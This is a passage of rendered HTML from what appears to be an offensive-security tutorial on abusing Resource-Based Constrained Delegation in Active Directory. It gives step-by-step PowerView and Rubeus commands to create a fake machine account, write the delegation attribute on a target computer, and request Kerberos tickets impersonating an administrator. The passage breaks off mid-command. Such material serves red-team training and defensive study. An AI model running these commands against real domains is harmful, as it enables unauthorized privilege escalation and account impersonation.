0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch4 id=\"32-creating-the-machine-account\">3.2 Creating the Machine Account\u003Ca class=\"anchor\" href=\"#32-creating-the-machine-account\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cp>Then create a fake machine account called \u003Cstrong>FAKE\u003C/strong> with the following password: \u003Ccode>Password123!\u003C/code> , make sure to not forget this password as you will need it in further exploitation\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:121ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">New-MachineAccount\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">MachineAccount \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'FAKE'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Password \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">$\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">ConvertTo-SecureString\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'Password123!'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">AsPlainText \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Force) \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Verbose\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>To check if the new machine account was successfully created, let’s try to check it using \u003Cstrong>PowerView\u003C/strong>\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:23ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Get-DomainComputer\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> FAKE\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch4 id=\"33-configuring-rbcd\">3.3 Configuring RBCD\u003Ca class=\"anchor\" href=\"#33-configuring-rbcd\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cblockquote>\n\u003Cp>Note: this part is done using powerview\u003C/p>\n\u003C/blockquote>\u003Cp>After that, we need to get the \u003Cem>SID\u003C/em> of the fake computer we just created\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:89ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$ComputerSid \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Get-DomainComputer\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'FAKE'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Properties objectsid \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> Select \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Expand objectsid\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Then we create a \u003Cem>security descriptor\u003C/em>\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:130ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$SD \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">New-Object\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> Security.AccessControl.RawSecurityDescriptor \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">ArgumentList \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$ComputerSid\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">)\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$SDBytes \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">New-Object\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> byte[] ($SD.BinaryLength)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$SD.GetBinaryForm($SDBytes\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">,\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>And finally let’s apply \u003Cem>Resource-Based Constrained Delegation\u003C/em> to the target computer, don’t forget to change the \u003Ccode>$TARGET\u003C/code> to your target computer\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:107ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Get-DomainComputer\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'$TARGET'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">|\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Set-DomainObject\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Set \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">@\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">{\u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'msds-allowedtoactonbehalfofotheridentity'\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$SDBytes}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Now let’s see if there’s success…\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:89ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Get-DomainComputer\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> $targetComputer \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Properties \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'msds-allowedtoactonbehalfofotheridentity'\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cblockquote>\n\u003Cp>It needs to show: msds-\u003Cem>allowedtoactonbehalfofotheridentity\u003C/em>\u003C/p>\n\u003C/blockquote>\u003Cp>\u003Cstrong>What this does?\u003C/strong>\u003C/p>\u003Cul>\n\u003Cli>Modifies the \u003Cstrong>\u003Ccode>msDS-AllowedToActOnBehalfOfOtherIdentity\u003C/code>\u003C/strong> attribute\u003C/li>\n\u003Cli>Adds your fake computer’s SID to the \u003Cstrong>security descriptor\u003C/strong>\u003C/li>\n\u003Cli>Allows your fake computer to \u003Cstrong>impersonate users\u003C/strong> on the target\u003C/li>\n\u003C/ul>\u003C/section>\u003Csection>\u003Ch4 id=\"performing-s4u-attack\">Performing S4U Attack\u003Ca class=\"anchor\" href=\"#performing-s4u-attack\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h4>\u003Cblockquote>\n\u003Cp>\u003Cstrong>S4U (Service-for-User)\u003C/strong> is a \u003Cstrong>Kerberos extension\u003C/strong> that allows a service to obtain tickets on behalf of users. It consists of \u003Cstrong>two components\u003C/strong> that are often exploited for privilege escalation\u003C/p>\n\u003Cul>\n\u003Cli>S4U2Proxy (Service for User to Proxy)\u003C/li>\n\u003Cli>S4U2Self (Service for User to Self)\u003C/li>\n\u003C/ul>\n\u003C/blockquote>\u003Cp>In order to do this, let’s download and import \u003Ccode>Rubeus.exe\u003C/code>\u003C/p>\u003Cul>\n\u003Cli>\u003Cstrong>Rubeus\u003C/strong> is a \u003Cstrong>C# toolset for raw Kerberos interaction and abuse\u003C/strong> that enables ticket extraction, \u003Cem>pass-the-ticket attacks\u003C/em>, \u003Cem>golden/silver ticket\u003C/em> creation, and \u003Cstrong>S4U\u003C/strong> delegation exploitation in \u003Cem>Active Directory\u003C/em> environments.\u003C/li>\n\u003C/ul>\u003Cp>First of all, we the \u003Cem>FAKE\u003C/em> computer with the password \u003Ccode>Password123!\u003C/code>, so we need the hash of that password. Keep in mind that the \u003Ccode>domain.com\u003C/code> shown on the command corresponds to the actual domain we are in\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:71ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">.\\\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Rubeus.exe\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> hash \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">password:Password123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">user:FAKE$ \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">domain:\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">domain.com\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cblockquote>\n\u003Cp>\u003Cstrong>Output:\u003C/strong> Provides \u003Cstrong>RC4, AES128, and AES256\u003C/strong> hashes of the machine account password.\u003C/p>\n\u003C/blockquote>\u003Cp>Now let’s request the service ticket for the \u003Cem>CIFS\u003C/em> service. Again keep in mind that that the \u003Ccode>target.com\u003C/code> shown is the target domain we want to attack and the \u003Cem>administrator\u003C/em> user is the user we want to impersonate\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:124ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">.\\\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">Rubeus.exe\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> s4u \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">user:FAKE$ \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">rc4:\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">RC4\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">HASH\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">impersonateuser:administrator \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">msdsspn:cifs\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">target.com\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan 